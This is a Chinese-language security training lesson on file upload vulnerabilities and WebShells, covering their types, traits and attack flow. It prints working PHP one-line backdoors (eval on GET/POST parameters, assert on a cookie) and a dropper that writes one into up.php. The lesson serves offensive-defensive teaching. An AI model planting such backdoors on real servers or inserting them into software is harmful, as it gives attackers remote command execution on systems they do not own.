# 护网行动红蓝攻防教程：P29：Web安全-5.文件上传漏洞 🛡️

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_1.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_2.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_4.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_6.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_8.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_9.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_11.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_13.png)

## 概述
在本节课中，我们将学习Web安全中的文件上传漏洞。我们将了解什么是WebShell，它的工作原理，以及如何利用文件上传漏洞来获取服务器权限。课程内容将涵盖WebShell的基本概念、分类、特点、攻击流程、常见类型、基本原理，以及如何通过实际演示来理解和利用这些知识。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_15.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_17.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_19.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_21.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_23.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_25.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_27.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_29.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_31.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_33.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_34.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_36.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_38.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_40.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_42.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_44.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_46.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_48.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_49.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_51.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_53.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_55.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_57.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_59.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_61.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_63.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_65.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_67.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_69.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_70.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_72.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_73.png)

## 什么是WebShell？🤔
WebShell是一种以ASP、PHP、JSP等网页文件形式存在的命令执行环境。这些网页文件是动态脚本文件，可以被称为网页木马后门。攻击者通常通过这样的网页后门来获取网站服务器的权限，包括控制网站服务器进行文件上传下载、查看数据库以及执行命令。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_75.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_77.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_79.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_81.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_83.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_85.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_87.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_89.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_91.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_93.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_95.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_97.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_99.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_101.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_103.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_105.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_107.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_108.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_110.png)

### 木马与后门
**木马**（特洛伊木马）是一种非授权的远程控制程序，其作用是开放系统权限，泄露用户信息给攻击者。它是黑客常用的工具，能够在计算机管理员不被发现的情况下获取系统权限。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_112.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_114.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_116.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_118.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_120.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_122.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_124.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_126.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_128.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_130.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_132.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_134.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_135.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_137.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_139.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_141.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_143.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_145.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_147.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_149.png)

**后门**是指计算机与外界通信所开启的端口。计算机总共有65535个端口，每个端口提供不同的服务。攻击者通过利用这些服务获得服务器权限，并留下后门。常见的服务包括：
*   **80端口**：提供Web服务。
*   **3389端口**：提供远程桌面连接服务。
*   **22端口**：提供SSH连接服务。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_151.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_153.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_155.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_157.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_158.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_160.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_162.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_164.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_166.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_168.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_170.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_172.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_174.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_176.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_178.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_180.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_182.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_184.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_186.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_188.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_190.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_192.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_194.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_196.png)

## WebShell的分类 📂
WebShell可以根据文件大小和脚本类型进行分类。

### 根据文件大小分类
以下是根据文件大小分类的三种WebShell：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_198.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_200.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_202.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_203.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_205.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_207.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_209.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_211.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_213.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_215.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_217.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_218.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_220.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_222.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_224.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_225.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_227.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_229.png)

1.  **一句话木马**：代码简短，只有一行代码，使用方便。
    ```php
    <?php @eval($_GET['pass']);?>
    ```
2.  **小马**：包含文件上传功能，体积较小。
3.  **大马**：体积较大，包含许多功能，代码通常进行加密隐藏。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_230.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_231.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_232.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_234.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_236.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_238.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_240.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_242.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_244.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_246.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_248.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_250.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_251.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_252.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_254.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_256.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_258.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_260.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_262.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_264.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_265.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_267.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_269.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_271.png)

### 根据脚本类型分类
常见的脚本类型包括ASP、ASPX、JSP以及PHP。目前，许多网站和CMS都是基于PHP语言开发的。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_273.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_275.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_277.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_279.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_281.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_283.png)

---

## WebShell的特点 ✨
WebShell具有以下四个特点：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_285.png)

1.  **动态脚本形式**：WebShell通常由动态脚本语言编写。
2.  **木马后门**：WebShell本身就是一种木马后门，通过它可以获取服务器权限并执行命令。
3.  **穿越防火墙**：WebShell通常通过80端口进行数据传递，因此可以穿越服务器防火墙。
4.  **日志记录**：WebShell一般不会在系统日志中留下记录，只会在Web日志中留下数据传递记录。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_287.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_289.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_291.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_293.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_295.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_297.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_298.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_300.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_302.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_304.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_306.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_308.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_310.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_312.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_314.png)

## WebShell的攻击流程 🔄
利用WebShell进行攻击的基本流程如下：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_316.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_318.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_320.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_322.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_324.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_326.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_328.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_330.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_332.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_334.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_336.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_338.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_340.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_342.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_344.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_346.png)

1.  **利用Web漏洞获取权限**：通过网站漏洞（如SQL注入、文件上传漏洞）获取Web权限。
2.  **上传小马**：利用获取的权限上传一个小马（文件上传功能）。
3.  **上传大马**：通过小马上传一个大马（功能丰富的WebShell）。
4.  **远程调用执行命令**：通过大马执行命令，获取服务器信息。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_348.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_350.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_352.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_354.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_356.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_357.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_359.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_361.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_363.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_365.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_367.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_368.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_370.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_372.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_374.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_375.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_377.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_379.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_381.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_382.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_384.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_386.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_388.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_390.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_392.png)

## 常见的WebShell示例 📝
以下是几种常见的WebShell示例：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_394.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_396.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_398.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_400.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_402.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_404.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_406.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_408.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_410.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_412.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_413.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_415.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_417.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_419.png)

### PHP一句话木马（GET方式）
```php
<?php @eval($_GET['pass']);?>
```
*   `eval()`函数将字符串作为PHP代码执行。
*   `$_GET['pass']`通过GET方式传递参数`pass`来执行命令。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_421.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_422.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_424.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_426.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_428.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_430.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_432.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_434.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_436.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_438.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_440.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_442.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_444.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_446.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_448.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_450.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_451.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_453.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_455.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_456.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_458.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_460.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_462.png)

### PHP一句话木马（POST方式）
```php
<?php @eval($_POST['pass']);?>
```
*   通过POST方式传递参数`pass`来执行命令。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_464.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_466.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_468.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_470.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_472.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_474.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_476.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_478.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_480.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_482.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_484.png)

### PHP一句话木马（Cookie方式）
```php
<?php @assert($_COOKIE['cmd']);?>
```
*   通过Cookie方式传递参数`cmd`来执行命令。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_486.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_488.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_490.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_492.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_494.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_496.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_498.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_500.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_502.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_504.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_506.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_508.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_510.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_512.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_514.png)

## WebShell的基本原理 ⚙️
WebShell的基本原理包括以下三点：

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_516.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_517.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_519.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_521.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_523.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_525.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_527.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_529.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_531.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_533.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_535.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_536.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_538.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_540.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_542.png)

1.  **可执行脚本**：WebShell是一个可执行的脚本文件。
2.  **数据传递**：通过HTTP数据包接收传递的数据（如GET、POST、Cookie方式）。
3.  **执行传递的数据**：通过执行函数（如`eval()`、`system()`）执行传递的数据。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_544.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_545.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_547.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_548.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_550.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_551.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_552.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_554.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_556.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_558.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_560.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_562.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_564.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_566.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_568.png)

### 执行传递数据的形式
*   **直接执行PHP函数**：如`eval()`、`system()`。
*   **文件包含**：通过文件包含漏洞执行文件中的PHP代码。
*   **动态函数执行**：将字符串作为函数名执行。
*   **回调函数**：通过回调函数执行代码。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_570.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_572.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_573.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_575.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_577.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_579.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_580.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_581.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_583.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_585.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_586.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_588.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_589.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_591.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_593.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_595.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_597.png)

---

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_599.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_600.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_602.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_604.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_606.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_608.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_610.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_611.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_613.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_615.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_617.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_618.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_620.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_622.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_623.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_625.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_626.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_628.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_629.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_630.png)

## 通过一句话木马写入小马 📄
通过一句话木马写入小马的基本命令如下：
```php
<?php
$file = fopen("up.php", "w");
fwrite($file, '<?php @eval($_POST["pass"]);?>');
fclose($file);
?>
```
*   `fopen()`函数创建文件。
*   `fwrite()`函数写入内容。
*   `fclose()`函数关闭文件。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_632.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_634.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_636.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_638.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_640.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_642.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_644.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_645.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_646.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_648.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_650.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_651.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_652.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_654.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_656.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_658.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_660.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_662.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_664.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_666.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_667.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_669.png)

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_671.png)

### 实际演示
1.  创建包含上述代码的PHP文件。
2.  访问该文件，会在当前目录生成`up.php`文件，内容为一句话木马。
3.  通过小马上传大马，获取更多功能。

![](img/4a71d6bd11fbd44fcb8d208aa4dd6d27_673.png)

